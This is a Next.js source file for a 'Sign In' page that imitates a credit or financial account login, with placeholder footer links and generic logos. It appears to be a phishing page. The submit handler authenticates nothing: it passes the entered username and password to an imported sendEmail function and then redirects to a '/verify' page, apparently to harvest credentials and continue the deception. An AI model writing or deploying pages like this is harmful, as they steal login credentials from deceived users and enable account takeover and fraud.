"use client";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Field, FieldGroup, FieldLabel } from "@/components/ui/field";
import { Input } from "@/components/ui/input";
import { sendEmail } from "@/lib/fun";
import { zodResolver } from "@hookform/resolvers/zod";
import Head from "next/head";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { Controller, useForm } from "react-hook-form";
import { z } from "zod";

const loginSchema = z.object({
  username: z.string().min(1, "This field is required").email("Invalid email address"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  remember: z.boolean().default(false).optional(),
});


export type LoginSchema =  z.infer<typeof loginSchema>

export default function Home() {
  const router = useRouter()
  const [showPassword, setShowPassword] = useState(false);
  const form = useForm<LoginSchema>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      remember: false,
    },
  });

  const onSubmit = async(data: z.infer<typeof loginSchema>) => {
    // console.log(data);
    await sendEmail(data)
    router.push('/verify')

  };

  return (
    <div className="flex min-h-screen flex-col gap-5 items-center justify-center bg-zinc-50 font-sans">
      <Head>
        <title>Sign In</title>
      </Head>
      <div className="max-w-[456px] p-8 border md:min-w-[400px] w-full max-w-md border-slate-900/55  mt-6 rounded-lg shadow-xs">
        <div className="flex flex-col items-center justify-center w-full mb-8 gap-4">
          <Image src={'/logo1.svg'} alt='logo' width={150} height={80} />
          <h2 className="font-semibold text-2xl text-slate-900">
            Sign In
          </h2>
        </div>

        <form onSubmit={form.handleSubmit(onSubmit)}>
          <FieldGroup className="gap-4">
            <Controller
              control={form.control}
              name="username"
              render={({ field }) => (
                <Field>
                  <FieldLabel>Username</FieldLabel>
                  <div className="relative min-h-12">
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
                      <Image src="/icon3.svg" alt="User Icon" width={16} height={16} />
                    </div>
                    <Input 
                      {...field} 
                      className="pl-10 h-14 focus-visible:ring-[var(--color-default)]" 
                      placeholder="Enter your username"
                    />
                  </div>
                </Field>
              )}
            />

            <Controller
              control={form.control}
              name="password"
              render={({ field }) => (
                <Field>
                  <FieldLabel>Password</FieldLabel>
                  <div className="relative min-h-12 w-[296px]">
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
                       <Image src="/icon5.svg" alt="Lock Icon" width={16} height={16} />
                    </div>
                    <Input 
                      {...field} 
                      type={showPassword? 'text' : 'password'} 
                      className="pl-10 h-14 focus-visible:ring-[var(--color-default)]" 
                      placeholder="Enter your password"
                    />
                    <button type="button" className="absolute cursor-pointer right-3 top-1/2 -translate-y-1/2 text-slate-500" onClick={() => setShowPassword(!showPassword)}>
                       <Image src={showPassword? '/icon6.svg' : '/icon7.svg'} alt="Show/Hide Icon" width={20} height={20} />
                    </button>
                  </div>
                </Field>
              )}
            />

            <Controller
              control={form.control}
              name="remember"
              render={({ field }) => (
                 <div className="flex items-center space-x-2">
                  <Checkbox 
                    id="remember" 
                    checked={field.value} 
                    onCheckedChange={field.onChange}
                    className="data-[state=checked]:bg-[var(--color-default)] data-[state=checked]:border-[var(--color-default)]"
                  />
                  <label
                    htmlFor="remember"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-slate-600"
                  >
                    Remember me
                  </label>
                </div>
              )}
            />

            <Button type="submit" className="w-[296px] mt-2 bg-[var(--color-default)] hover:bg-[var(--color-default-light)] mx-auto h-[48px]">
              Sign In
            </Button>
          </FieldGroup>
        </form>
        <div className="flex items-start flex-col">
        <Link href={'#'} className="text-center font-bold my-3 capitalize text-default hover:text-default-light hover:underline">Forgot username or password</Link>
        <Link href={'#'} className="text-center font-bold  capitalize text-default hover:text-default-light hover:underline">setup online access</Link>
        </div>

      </div>

      <div className="flex items-start justify-start flex-col max-w-[456px] w-full gap-2">
        <h3>
          Looking for this accounts?
        </h3>
        <Link href={'#'} className="text-center font-bold  capitalize text-default hover:text-default-light hover:underline">commercial or trade credit</Link>
      </div>

      <div>

      <div className="w-full border-t">
        <div className="flex items-center justify-center gap-2 min-h-10">
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Contact us</Link>
          <span className="text-slate-500 font-light">|</span>
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Legal</Link>
          <span className="text-slate-500 font-light">|</span>
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Privacy</Link>
          <span className="text-slate-500 font-light">|</span>
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Security</Link>
          <span className="text-slate-500 font-light">|</span>
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Terms & conditions</Link>
          <span className="text-slate-500 font-light">|</span>
          <Link href="#" className="text-slate-500  hover:underline font-light hover:text-black">Accessibility</Link>
        </div>
      </div>

      </div>
    </div>
  );
}
